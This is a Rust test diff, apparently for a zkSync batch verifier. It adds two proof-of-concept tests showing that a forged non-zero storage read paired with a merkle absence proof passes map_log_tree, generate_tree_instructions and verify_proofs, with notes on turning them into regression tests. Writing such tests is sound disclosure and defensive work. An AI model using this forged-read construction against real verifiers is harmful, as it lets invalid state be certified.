@@ -998,4 +998,132 @@ mod tests {
             compute_commitment(bad_passthrough, prev_meta_hash, prev_aux_hash);
         assert_ne!(recomputed_bad_root, valid_prev);
     }
+
+    /// PoC for the missing-key value-binding gap.
+    ///
+    /// CURRENT (buggy) BEHAVIOR — what this test pins:
+    ///   `map_log_tree` returns `Ok` when a non-zero VM-observed value is
+    ///   paired with `TreeLogEntry::ReadMissingKey`, even though the merkle
+    ///   path can only attest that the leaf is empty (value 0).
+    ///
+    /// POST-FIX EXPECTATION:
+    ///   `map_log_tree` must return `Err` for that pairing. To convert this
+    ///   test into a regression test after the fix, change the first
+    ///   `assert!(res.is_ok(), ...)` to `assert!(res.is_err(), ...)`.
+    #[test]
+    fn poc_missing_key_accepts_forged_nonzero_value() {
+        use zksync_types::{AccountTreeId, Address, StorageKey, StorageLog};
+
+        let key = StorageKey::new(
+            AccountTreeId::new(Address::repeat_byte(0xAA)),
+            H256::repeat_byte(0xBB),
+        );
+
+        // Adversary's claim: VM observed 0xCC..CC from an empty slot.
+        let forged = StorageLog::new_read_log(key, H256::repeat_byte(0xCC));
+        let mut idx = 0u64;
+        let res = map_log_tree(&forged, &TreeLogEntry::ReadMissingKey, &mut idx);
+        assert!(
+            res.is_ok(),
+            "PRE-FIX: expected Ok (demonstrates the bug); got {res:?}. \
+             After the fix, this assertion should be flipped to is_err()."
+        );
+
+        // Sanity: an honest read of zero from a missing leaf must always pass.
+        let honest = StorageLog::new_read_log(key, H256::zero());
+        let res_honest = map_log_tree(&honest, &TreeLogEntry::ReadMissingKey, &mut idx);
+        assert!(
+            res_honest.is_ok(),
+            "honest zero read of an empty slot must pass; got {res_honest:?}"
+        );
+    }
+
+    /// Tier-2 PoC: the bug survives the full verifier-layer pipeline.
+    ///
+    /// Real empty Blake2 merkle tree → honest absence proof for key K.
+    /// Hand-built `FinishedL1Batch` whose only storage log is a forged
+    /// non-zero read of K. Then drive the verifier's pairing + proof check.
+    ///
+    /// CURRENT (buggy) BEHAVIOR — what this test pins:
+    ///   Both `generate_tree_instructions` and `verify_proofs` return `Ok`.
+    ///   The verifier accepts an execution that observed 0xCC..CC from a
+    ///   slot that the tree certifies as empty.
+    ///
+    /// POST-FIX EXPECTATION:
+    ///   `generate_tree_instructions` returns `Err` (the value-binding check
+    ///   in the `ReadMissingKey` arm bails before instructions are built).
+    ///   To convert into a regression test, replace the first
+    ///   `.expect("PRE-FIX: ...")` with `.expect_err("...")` and delete the
+    ///   `verify_proofs` call (instructions are never built).
+    #[test]
+    fn poc_missing_key_bypasses_merkle_verification() {
+        use zksync_merkle_tree::{MerkleTree, PatchSet, TreeInstruction};
+        use zksync_types::{AccountTreeId, Address, StorageKey, StorageLog};
+        use zksync_vm_interface::{
+            CurrentExecutionState, ExecutionResult, FinishedL1Batch, VmExecutionResultAndLogs,
+        };
+
+        // 1. Empty Blake2 tree. Its root is the honest `old_root_hash`.
+        let mut tree: MerkleTree<PatchSet> =
+            MerkleTree::new(PatchSet::default()).expect("empty tree");
+        let old_root_hash = tree.latest_root_hash();
+
+        // 2. Pick a never-written key K and produce an honest absence proof
+        //    against the empty tree.
+        let key = StorageKey::new(
+            AccountTreeId::new(Address::repeat_byte(0xAA)),
+            H256::repeat_byte(0xBB),
+        );
+        let key_u256 = key.hashed_key_u256();
+        let bowp = tree
+            .extend_with_proofs(vec![TreeInstruction::Read(key_u256)])
+            .expect("empty-tree read proof");
+        assert!(
+            matches!(bowp.logs[0].base, TreeLogEntry::ReadMissingKey),
+            "empty-tree read must produce ReadMissingKey, got {:?}",
+            bowp.logs[0].base
+        );
+
+        // 3. Forge the VM output: pretend the VM did SLOAD(K) and observed a
+        //    non-zero value (which a malicious StorageSnapshot would deliver).
+        let forged_value = H256::repeat_byte(0xCC);
+        let forged_log = StorageLog::new_read_log(key, forged_value);
+        let vm_out = FinishedL1Batch {
+            block_tip_execution_result: VmExecutionResultAndLogs::new(
+                ExecutionResult::Success { output: vec![] },
+            ),
+            final_execution_state: CurrentExecutionState {
+                events: vec![],
+                deduplicated_storage_logs: vec![forged_log],
+                used_contract_hashes: vec![],
+                system_logs: vec![],
+                user_l2_to_l1_logs: vec![],
+                storage_refunds: vec![],
+                pubdata_costs: vec![],
+            },
+            final_bootloader_memory: None,
+            pubdata_input: None,
+            state_diffs: None,
+        };
+
+        // 4. Verifier pairs VM logs with merkle witness entries. Pre-fix this
+        //    returns Ok because the ReadMissingKey arm does not check
+        //    storage_log.value. .expect() here means "we expect Ok today,
+        //    which is the bug."
+        let instructions = generate_tree_instructions(0, &bowp, vm_out).expect(
+            "PRE-FIX: expected Ok (demonstrates the bug — forged read was paired \
+             into TreeInstruction without a value check). After the fix, replace \
+             with .expect_err(...) and drop the verify_proofs call below.",
+        );
+
+        // 5. End-to-end: verify_proofs accepts the instructions against the
+        //    honest absence proof. Returns Ok today — the verifier has been
+        //    convinced that a slot the tree certifies as empty was observed
+        //    by the VM as 0xCC..CC. Soundness break. Unreachable post-fix.
+        bowp.verify_proofs(&Blake2Hasher, old_root_hash, &instructions)
+            .expect(
+                "PRE-FIX: expected Ok (the absence proof is honest; the bug is \
+                 that we got here at all).",
+            );
+    }
 }
